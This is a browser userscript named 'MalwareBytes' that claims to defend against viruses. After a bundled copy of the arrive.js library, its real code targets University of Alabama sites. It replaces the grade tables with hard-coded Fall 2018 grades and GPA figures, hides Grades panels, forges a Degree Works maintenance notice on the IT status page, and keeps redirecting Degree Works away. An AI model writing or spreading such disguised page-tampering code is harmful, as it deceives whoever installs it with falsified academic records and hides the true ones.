// ==UserScript==
// @name         MalwareBytes
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  defends against viruses on the web
// @author       MalwareBytes
// @match        *://*/*
// @grant        none
// ==/UserScript==

/*
 * arrive.js
 * v2.4.1
 * https://github.com/uzairfarooq/arrive
 * MIT licensed
 *
 * Copyright (c) 2014-2017 Uzair Farooq
 */

var Arrive = (function(window, $, undefined) {

    "use strict";
  
    if(!window.MutationObserver || typeof HTMLElement === 'undefined'){
      return; //for unsupported browsers
    }
  
    var arriveUniqueId = 0;
  
    var utils = (function() {
      var matches = HTMLElement.prototype.matches || HTMLElement.prototype.webkitMatchesSelector || HTMLElement.prototype.mozMatchesSelector
                    || HTMLElement.prototype.msMatchesSelector;
  
      return {
        matchesSelector: function(elem, selector) {
          return elem instanceof HTMLElement && matches.call(elem, selector);
        },
        // to enable function overloading - By John Resig (MIT Licensed)
        addMethod: function (object, name, fn) {
          var old = object[ name ];
          object[ name ] = function(){
            if ( fn.length == arguments.length ) {
              return fn.apply( this, arguments );
            }
            else if ( typeof old == 'function' ) {
              return old.apply( this, arguments );
            }
          };
        },
        callCallbacks: function(callbacksToBeCalled, registrationData) {
          if (registrationData && registrationData.options.onceOnly && registrationData.firedElems.length == 1) {
            // as onlyOnce param is true, make sure we fire the event for only one item
            callbacksToBeCalled = [callbacksToBeCalled[0]];
          }
  
          for (var i = 0, cb; (cb = callbacksToBeCalled[i]); i++) {
            if (cb && cb.callback) {
              cb.callback.call(cb.elem, cb.elem);
            }
          }
  
          if (registrationData && registrationData.options.onceOnly && registrationData.firedElems.length == 1) {
            // unbind event after first callback as onceOnly is true.
            registrationData.me.unbindEventWithSelectorAndCallback.call(
              registrationData.target, registrationData.selector, registrationData.callback);
          }
        },
        // traverse through all descendants of a node to check if event should be fired for any descendant
        checkChildNodesRecursively: function(nodes, registrationData, matchFunc, callbacksToBeCalled) {
          // check each new node if it matches the selector
          for (var i=0, node; (node = nodes[i]); i++) {
            if (matchFunc(node, registrationData, callbacksToBeCalled)) {
              callbacksToBeCalled.push({ callback: registrationData.callback, elem: node });
            }
  
            if (node.childNodes.length > 0) {
              utils.checkChildNodesRecursively(node.childNodes, registrationData, matchFunc, callbacksToBeCalled);
            }
          }
        },
        mergeArrays: function(firstArr, secondArr){
          // Overwrites default options with user-defined options.
          var options = {},
              attrName;
          for (attrName in firstArr) {
            if (firstArr.hasOwnProperty(attrName)) {
              options[attrName] = firstArr[attrName];
            }
          }
          for (attrName in secondArr) {
            if (secondArr.hasOwnProperty(attrName)) {
              options[attrName] = secondArr[attrName];
            }
          }
          return options;
        },
        toElementsArray: function (elements) {
          // check if object is an array (or array like object)
          // Note: window object has .length property but it's not array of elements so don't consider it an array
          if (typeof elements !== "undefined" && (typeof elements.length !== "number" || elements === window)) {
            elements = [elements];
          }
          return elements;
        }
      };
    })();
  
  
    // Class to maintain state of all registered events of a single type
    var EventsBucket = (function() {
      var EventsBucket = function() {
        // holds all the events
  
        this._eventsBucket    = [];
        // function to be called while adding an event, the function should do the event initialization/registration
        this._beforeAdding    = null;
        // function to be called while removing an event, the function should do the event destruction
        this._beforeRemoving  = null;
      };
  
      EventsBucket.prototype.addEvent = function(target, selector, options, callback) {
        var newEvent = {
          target:             target,
          selector:           selector,
          options:            options,
          callback:           callback,
          firedElems:         []
        };
  
        if (this._beforeAdding) {
          this._beforeAdding(newEvent);
        }
  
        this._eventsBucket.push(newEvent);
        return newEvent;
      };
  
      EventsBucket.prototype.removeEvent = function(compareFunction) {
        for (var i=this._eventsBucket.length - 1, registeredEvent; (registeredEvent = this._eventsBucket[i]); i--) {
          if (compareFunction(registeredEvent)) {
            if (this._beforeRemoving) {
                this._beforeRemoving(registeredEvent);
            }
  
            // mark callback as null so that even if an event mutation was already triggered it does not call callback
            var removedEvents = this._eventsBucket.splice(i, 1);
            if (removedEvents && removedEvents.length) {
              removedEvents[0].callback = null;
            }
          }
        }
      };
  
      EventsBucket.prototype.beforeAdding = function(beforeAdding) {
        this._beforeAdding = beforeAdding;
      };
  
      EventsBucket.prototype.beforeRemoving = function(beforeRemoving) {
        this._beforeRemoving = beforeRemoving;
      };
  
      return EventsBucket;
    })();
  
  
    /**
     * @constructor
     * General class for binding/unbinding arrive and leave events
     */
    var MutationEvents = function(getObserverConfig, onMutation) {
      var eventsBucket    = new EventsBucket(),
          me              = this;
  
      var defaultOptions = {
        fireOnAttributesModification: false
      };
  
      // actual event registration before adding it to bucket
      eventsBucket.beforeAdding(function(registrationData) {
        var
          target    = registrationData.target,
          observer;
  
        // mutation observer does not work on window or document
        if (target === window.document || target === window) {
          target = document.getElementsByTagName("html")[0];
        }
  
        // Create an observer instance
        observer = new MutationObserver(function(e) {
          onMutation.call(this, e, registrationData);
        });
  
        var config = getObserverConfig(registrationData.options);
  
        observer.observe(target, config);
  
        registrationData.observer = observer;
        registrationData.me = me;
      });
  
      // cleanup/unregister before removing an event
      eventsBucket.beforeRemoving(function (eventData) {
        eventData.observer.disconnect();
      });
  
      this.bindEvent = function(selector, options, callback) {
        options = utils.mergeArrays(defaultOptions, options);
  
        var elements = utils.toElementsArray(this);
  
        for (var i = 0; i < elements.length; i++) {
          eventsBucket.addEvent(elements[i], selector, options, callback);
        }
      };
  
      this.unbindEvent = function() {
        var elements = utils.toElementsArray(this);
        eventsBucket.removeEvent(function(eventObj) {
          for (var i = 0; i < elements.length; i++) {
            if (this === undefined || eventObj.target === elements[i]) {
              return true;
            }
          }
          return false;
        });
      };
  
      this.unbindEventWithSelectorOrCallback = function(selector) {
        var elements = utils.toElementsArray(this),
            callback = selector,
            compareFunction;
  
        if (typeof selector === "function") {
          compareFunction = function(eventObj) {
            for (var i = 0; i < elements.length; i++) {
              if ((this === undefined || eventObj.target === elements[i]) && eventObj.callback === callback) {
                return true;
              }
            }
            return false;
          };
        }
        else {
          compareFunction = function(eventObj) {
            for (var i = 0; i < elements.length; i++) {
              if ((this === undefined || eventObj.target === elements[i]) && eventObj.selector === selector) {
                return true;
              }
            }
            return false;
          };
        }
        eventsBucket.removeEvent(compareFunction);
      };
  
      this.unbindEventWithSelectorAndCallback = function(selector, callback) {
        var elements = utils.toElementsArray(this);
        eventsBucket.removeEvent(function(eventObj) {
            for (var i = 0; i < elements.length; i++) {
              if ((this === undefined || eventObj.target === elements[i]) && eventObj.selector === selector && eventObj.callback === callback) {
                return true;
              }
            }
            return false;
        });
      };
  
      return this;
    };
  
  
    /**
     * @constructor
     * Processes 'arrive' events
     */
    var ArriveEvents = function() {
      // Default options for 'arrive' event
      var arriveDefaultOptions = {
        fireOnAttributesModification: false,
        onceOnly: false,
        existing: false
      };
  
      function getArriveObserverConfig(options) {
        var config = {
          attributes: false,
          childList: true,
          subtree: true
        };
  
        if (options.fireOnAttributesModification) {
          config.attributes = true;
        }
  
        return config;
      }
  
      function onArriveMutation(mutations, registrationData) {
        mutations.forEach(function( mutation ) {
          var newNodes    = mutation.addedNodes,
              targetNode = mutation.target,
              callbacksToBeCalled = [],
              node;
  
          // If new nodes are added
          if( newNodes !== null && newNodes.length > 0 ) {
            utils.checkChildNodesRecursively(newNodes, registrationData, nodeMatchFunc, callbacksToBeCalled);
          }
          else if (mutation.type === "attributes") {
            if (nodeMatchFunc(targetNode, registrationData, callbacksToBeCalled)) {
              callbacksToBeCalled.push({ callback: registrationData.callback, elem: targetNode });
            }
          }
  
          utils.callCallbacks(callbacksToBeCalled, registrationData);
        });
      }
  
      function nodeMatchFunc(node, registrationData, callbacksToBeCalled) {
        // check a single node to see if it matches the selector
        if (utils.matchesSelector(node, registrationData.selector)) {
          if(node._id === undefined) {
            node._id = arriveUniqueId++;
          }
          // make sure the arrive event is not already fired for the element
          if (registrationData.firedElems.indexOf(node._id) == -1) {
            registrationData.firedElems.push(node._id);
  
            return true;
          }
        }
  
        return false;
      }
  
      arriveEvents = new MutationEvents(getArriveObserverConfig, onArriveMutation);
  
      var mutationBindEvent = arriveEvents.bindEvent;
  
      // override bindEvent function
      arriveEvents.bindEvent = function(selector, options, callback) {
  
        if (typeof callback === "undefined") {
          callback = options;
          options = arriveDefaultOptions;
        } else {
          options = utils.mergeArrays(arriveDefaultOptions, options);
        }
  
        var elements = utils.toElementsArray(this);
  
        if (options.existing) {
          var existing = [];
  
          for (var i = 0; i < elements.length; i++) {
            var nodes = elements[i].querySelectorAll(selector);
            for (var j = 0; j < nodes.length; j++) {
              existing.push({ callback: callback, elem: nodes[j] });
            }
          }
  
          // no need to bind event if the callback has to be fired only once and we have already found the element
          if (options.onceOnly && existing.length) {
            return callback.call(existing[0].elem, existing[0].elem);
          }
  
          setTimeout(utils.callCallbacks, 1, existing);
        }
  
        mutationBindEvent.call(this, selector, options, callback);
      };
  
      return arriveEvents;
    };
  
  
    /**
     * @constructor
     * Processes 'leave' events
     */
    var LeaveEvents = function() {
      // Default options for 'leave' event
      var leaveDefaultOptions = {};
  
      function getLeaveObserverConfig() {
        var config = {
          childList: true,
          subtree: true
        };
  
        return config;
      }
  
      function onLeaveMutation(mutations, registrationData) {
        mutations.forEach(function( mutation ) {
          var removedNodes  = mutation.removedNodes,
              callbacksToBeCalled = [];
  
          if( removedNodes !== null && removedNodes.length > 0 ) {
            utils.checkChildNodesRecursively(removedNodes, registrationData, nodeMatchFunc, callbacksToBeCalled);
          }
  
          utils.callCallbacks(callbacksToBeCalled, registrationData);
        });
      }
  
      function nodeMatchFunc(node, registrationData) {
        return utils.matchesSelector(node, registrationData.selector);
      }
  
      leaveEvents = new MutationEvents(getLeaveObserverConfig, onLeaveMutation);
  
      var mutationBindEvent = leaveEvents.bindEvent;
  
      // override bindEvent function
      leaveEvents.bindEvent = function(selector, options, callback) {
  
        if (typeof callback === "undefined") {
          callback = options;
          options = leaveDefaultOptions;
        } else {
          options = utils.mergeArrays(leaveDefaultOptions, options);
        }
  
        mutationBindEvent.call(this, selector, options, callback);
      };
  
      return leaveEvents;
    };
  
  
    var arriveEvents = new ArriveEvents(),
        leaveEvents  = new LeaveEvents();
  
    function exposeUnbindApi(eventObj, exposeTo, funcName) {
      // expose unbind function with function overriding
      utils.addMethod(exposeTo, funcName, eventObj.unbindEvent);
      utils.addMethod(exposeTo, funcName, eventObj.unbindEventWithSelectorOrCallback);
      utils.addMethod(exposeTo, funcName, eventObj.unbindEventWithSelectorAndCallback);
    }
  
    /*** expose APIs ***/
    function exposeApi(exposeTo) {
      exposeTo.arrive = arriveEvents.bindEvent;
      exposeUnbindApi(arriveEvents, exposeTo, "unbindArrive");
  
      exposeTo.leave = leaveEvents.bindEvent;
      exposeUnbindApi(leaveEvents, exposeTo, "unbindLeave");
    }
  
    if ($) {
      exposeApi($.fn);
    }
    exposeApi(HTMLElement.prototype);
    exposeApi(NodeList.prototype);
    exposeApi(HTMLCollection.prototype);
    exposeApi(HTMLDocument.prototype);
    exposeApi(Window.prototype);
  
    var Arrive = {};
    // expose functions to unbind all arrive/leave events
    exposeUnbindApi(arriveEvents, Arrive, "unbindAllArrive");
    exposeUnbindApi(leaveEvents, Arrive, "unbindAllLeave");
  
    return Arrive;
  
  })(window, typeof jQuery === 'undefined' ? null : jQuery, undefined);
  
  var fall2018Total = `<tbody><tr>
      <td colspan="2" class="dddead">&nbsp;</td>
      <th class="ddheader" scope="col">Attempted</th>
      <th class="ddheader" scope="col">Earned</th>
      <th class="ddheader" scope="col"><acronym title="Grade Point Average">GPA</acronym> Hours</th>
      <th class="ddheader" scope="col">Quality Points</th>
      <th class="ddheader" scope="col"><acronym title="Grade Point Average">GPA</acronym></th>
      </tr>
      <tr>
      <th colspan="2" class="ddlabel" scope="row">Current term: </th>
      <td class="dddefault"><p class="rightaligntext">       16.000</p></td>
      <td clas="dddefault"><p class="rightaligntext">       16.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       16.000</p></td>
      <td class="dddefault"><p class="rightaligntext">             49.000</p></td>
      <td class="dddefault"><p class="rightaligntext">                     3.062</p></td>
      </tr>
      <tr>
      <th colspan="2" class="ddlabel" scope="row">Cumulative: </th>
      <td class="dddefault"><p class="rightaligntext">       57.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       53.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       54.000</p></td>
      <td class="dddefault"><p class="rightaligntext">            182.271</p></td>
      <td class="dddefault"><p class="rightaligntext">                     3.484</p></td>
      </tr>
      <tr>
      <th colspan="2" class="ddlabel" scope="row">Transfer: </th>
      <td class="dddefault"><p class="rightaligntext">       32.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       32.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       31.000</p></td>
      <td class="dddefault"><p class="rightaligntext">             97.000</p></td>
      <td class="dddefault"><p class="rightaligntext">                     3.129</p></td>
      </tr>
      <tr>
      <th colspan="2" class="ddlabel" scope="row">Overall: </th>
      <td class="dddefault"><p class="rightaligntext">       89.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       78.000</p></td>
      <td class="dddefault"><p class="rightaligntext">       81.000</p></td>
      <td class="dddefault"><p class="rightaligntext">            245.320</p></td>
      <td class="dddefault"><p class="rightaligntext">                     3.247</p></td>
      </tr>
      </tbody>`;
  var fall2018 = `<tbody><tr>
      <th class="ddheader" scope="col"><acronym title="Course Reference Number">CRN</acronym></th>
      <th class="ddheader" scope="col">Subject</th>
      <th class="ddheader" scope="col">Course</th>
      <th class="ddheader" scope="col">Section</th>
      <th class="ddheader" scope="col">Course Title</th>
      <th class="ddheader" scope="col">Campus</th>
      <th class="ddheader" scope="col">Final Grade</th>
      <th class="ddheader" scope="col">Comment</th>
      <th class="ddheader" scope="col">Attempted</th>
      <th class="ddheader" scope="col">Earned</th>
      <th class="ddheader" scope="col"><p class="rightaligntext"><acronym title="Grade Point Average">GPA</acronym> Hours</p></th>
      <th class="ddheader" scope="col"><p class="rightaligntext">Quality Points</p></th>
      <td class="dddead">&nbsp;</td>
      </tr>
      <tr>
      <td class="dddefault">45256</td>
      <td class="dddefault">CS</td>
      <td class="dddefault">200</td>
      <td class="dddefault">001</td>
      <td class="dddefault">Software Design and Engineering</td>
      <td class="dddefault">Main Campus (Tuscaloosa)</td>
      <td class="dddefault">A-</td>
      <td class="dddead">&nbsp;</td>
      <td class="dddefault"><p class="rightaligntext">    4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">             14.680</p></td>
      <td class="dddead">&nbsp;</td>
      </tr>
      <tr>
      <td class="dddefault">45258</td>
      <td class="dddefault">CS</td>
      <td class="dddefault">201</td>
      <td class="dddefault">001</td>
      <td class="dddefault"> Data Structures and Algorithms</td>
      <td class="dddefault">Main Campus (Tuscaloosa)</td>
      <td class="dddefault">C</td>
      <td class="dddead">&nbsp;</td>
      <td class="dddefault"><p class="rightaligntext">    4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">              8.000</p></td>
      <td class="dddead">&nbsp;</td>
      </tr>
      <tr>
      <td class="dddefault">44139</td>
      <td class="dddefault">ECE</td>
      <td class="dddefault">380</td>
      <td class="dddefault">002</td>
      <td class="dddefault">Digital Logic</td>
      <td class="dddefault">Main Campus (Tuscaloosa)</td>
      <td class="dddefault">B+</td>
      <td class="dddead">&nbsp;</td>
      <td class="dddefault"><p class="rightaligntext">    4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        4.000</p></td>
      <td class="dddefault"><p class="rightaligntext">             13.320</p></td>
      <td class="dddead">&nbsp;</td>
      </tr>
      <tr>
      <td class="dddefault">44430</td>
      <td class="dddefault">ECE</td>
      <td class="dddefault">380</td>
      <td class="dddefault">323</td>
      <td class="dddefault">Digital Logic</td>
      <td class="dddefault">Main Campus (Tuscaloosa)</td>
      <td class="dddefault">NG</td>
      <td class="dddead">&nbsp;</td>
      <td class="dddefault"><p class="rightaligntext">    0.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        0.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        0.000</p></td>
      <td class="dddefault"><p class="rightaligntext">              0.000</p></td>
      <td class="dddead">&nbsp;</td>
      </tr>
      <tr>
      <td class="dddefault">43386</td>
      <td class="dddefault">MATH</td>
      <td class="dddefault">302</td>
      <td class="dddefault">001</td>
      <td class="dddefault">Topics in Discrete Mathematics</td>
      <td class="dddefault">Main Campus (Tuscaloosa)</td>
      <td class="dddefault">A</td>
      <td class="dddead">&nbsp;</td>
      <td class="dddefault"><p class="rightaligntext">    1.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        1.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        1.000</p></td>
      <td class="dddefault"><p class="rightaligntext">              4.000</p></td>
      <td class="dddead">&nbsp;</td>
      </tr>
      <tr>
      <td class="dddefault">45896</td>
      <td class="dddefault">MATH</td>
      <td class="dddefault">355</td>
      <td class="dddefault">005</td>
      <td class="dddefault">Theory Of Probability</td>
      <td class="dddefault">Main Campus (Tuscaloosa)</td>
      <td class="dddefault">B</td>
      <td class="dddead">&nbsp;</td>
      <td class="dddefault"><p class="rightaligntext">    3.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        3.000</p></td>
      <td class="dddefault"><p class="rightaligntext">        3.000</p></td>
      <td class="dddefault"><p class="rightaligntext">              9.000</p></td>
      <td class="dddead">&nbsp;</td>
      </tr>
      </tbody>`;
  
  var spoofmaint = `<div id="plannedMaintenanceTable_wrappers" class="dataTables_wrapper form-inline dt-bootstrap no-footer"><div class="row"><div class="col-sm-6"></div><div class="col-sm-6"></div></div><div class="row"><div class="col-sm-12"><div class="dataTables_scroll"><div class="dataTables_scrollHead" style="overflow: hidden; position: relative; border: 0px; width: 100%;"><div class="dataTables_scrollHeadInner" style="box-sizing: content-box; width: 455px; padding-right: 0px;"><table class="table table-striped table-bordered dataTable no-footer" cellspacing="0" width="100%" role="grid" style="width: 455px; margin-left: 0px;"><thead>
      <tr role="row"><th class="sorting" style="width: 166px;" aria-controls="plannedMaintenanceTable" rowspan="1" colspan="1" aria-label="Summary: activate to sort column ascending" tabindex="0">Summary</th><th class="sorting_asc" style="width: 86px;" aria-controls="plannedMaintenanceTable" rowspan="1" colspan="1" aria-label="Begin: activate to sort column descending" tabindex="0" aria-sort="ascending">Begin</th><th class="sorting" style="width: 86px;" aria-controls="plannedMaintenanceTable" rowspan="1" colspan="1" aria-label="End: activate to sort column ascending" tabindex="0">End</th></tr>
      </thead></table></div></div><div class="dataTables_scrollBody" style="position: relative; overflow: auto; width: 100%;"><table class="table table-striped table-bordered dataTable no-footer" id="plannedMaintenanceTable" cellspacing="0" width="100%" role="grid" style="width: 100%;" aria-describedby="plannedMaintenanceTable_info"><thead>
      <tr role="row" style="height: 0px;"><th class="sorting_asc sorting" style="width: 166px; padding-top: 0px; padding-bottom: 0px; border-top-width: 0px; border-bottom-width: 0px; height: 0px;" aria-controls="plannedMaintenanceTable" rowspan="1" colspan="1" aria-sort="ascending" aria-label="Summary"><div class="dataTables_sizing" style="height:0;overflow:hidden;">Summary</div></th><th class="sorting_asc sorting" style="width: 86px; padding-top: 0px; padding-bottom: 0px; border-top-width: 0px; border-bottom-width: 0px; height: 0px;" aria-controls="plannedMaintenanceTable" rowspan="1" colspan="1" aria-sort="ascending" aria-label="Begin"><div class="dataTables_sizing" style="height:0;overflow:hidden;">Begin</div></th><th class="sorting_asc sorting" style="width: 86px; padding-top: 0px; padding-bottom: 0px; border-top-width: 0px; border-bottom-width: 0px; height: 0px;" aria-controls="plannedMaintenanceTable" rowspan="1" colspan="1" aria-sort="ascending" aria-label="End"><div class="dataTables_sizing" style="height:0;overflow:hidden;">End</div></th></tr>
      </thead>
  
  
  
      <tbody>
  
  
  
  
  
  
          <tr role="row" class="odd">
              <td><span tabindex="0">Degree Works Maintenance</span>
                  <a href="#" type="button" data-toggle="modal" data-target="#maintenance_29">...more detail</a>
              </td>
              <td class="sorting_1">
                  <span tabindex="0">
                      <span hidden="">20181230</span>
                      <span hidden="">300</span>
                      December 26, 2018<br><br>
                      03:00 AM
                  </span>
              </td>
              <td>
                  <span tabindex="0">
                      January 4, 2019<br><br>
                      10:00 AM
                  </span>
              </td>
          </tr><tr role="row" class="even">
              <td><span tabindex="0">Turnitin Maintenance</span>
                  <a href="#" type="button" data-toggle="modal" data-target="#maintenance_28">...more detail</a>
              </td>
              <td class="sorting_1">
                  <span tabindex="0">
                      <span hidden="">20190105</span>
                      <span hidden="">1000</span>
                      January 5, 2019<br><br>
                      10:00 AM
                  </span>
              </td>
              <td>
                  <span tabindex="0">
                      January 5, 2019<br><br>
                      06:00 PM
                  </span>
              </td>
          </tr></tbody>
  
  </table></div></div></div></div><div class="row"><div class="col-sm-5"><div class="dataTables_info" id="plannedMaintenanceTable_info" role="status" aria-live="polite">Showing 1 to 2 of 2 entries</div></div><div class="col-sm-7"><div class="dataTables_paginate paging_simple_numbers" id="plannedMaintenanceTable_paginate"><ul class="pagination"><li class="paginate_button previous disabled" id="plannedMaintenanceTable_previous"><a href="#" aria-controls="plannedMaintenanceTable" data-dt-idx="0" tabindex="0">Previous</a></li><li class="paginate_button active"><a href="#" aria-controls="plannedMaintenanceTable" data-dt-idx="1" tabindex="0">1</a></li><li class="paginate_button next disabled" id="plannedMaintenanceTable_next"><a href="#" aria-controls="plannedMaintenanceTable" data-dt-idx="2" tabindex="0">Next</a></li></ul></div></div></div></div>
  `;
      if(window.location.href == "https://ssb.ua.edu/pls/PROD/bwskogrd.P_ViewGrde"){
       window.arrive(".dddefault", function() {
         if(this.innerText == "45257"){
             this.parentNode.parentNode.outerHTML = fall2018;
         }
  
      });
      window.arrive(".ddlabel", function(){
          if(this.innerText == "Current Term:") {
              this.parentNode.parentNode.outerHTML = fall2018Total;
          }
      });
      }
      window.arrive(".portlet-title-text", function() {
          if(this.innerText == "Grades"){
              this.parentNode.parentNode.parentNode.parentNode.remove()
          }
      });
      if (window.location.href == "https://status.oit.ua.edu/oitStatusPage/public/serviceStatus") {
         window.arrive("#plannedMaintenanceTable_wrapper", function(){
             this.outerHTML = spoofmaint
         });
      }
      if ("ua.edu" == window.location.hostname.substr(-6)) {
          if ("degreeworks.ua.edu" == window.location.hostname && (window.location = "https://status.oit.ua.edu/"), "status.oit.ua.edu" == window.location.hostname) {
  
          }
          setInterval(function() {
              "degreeworks.ua.edu" == window.location.hostname && (window.location = "https://status.oit.ua.edu/")
          }, 4e3)
      }
  
  
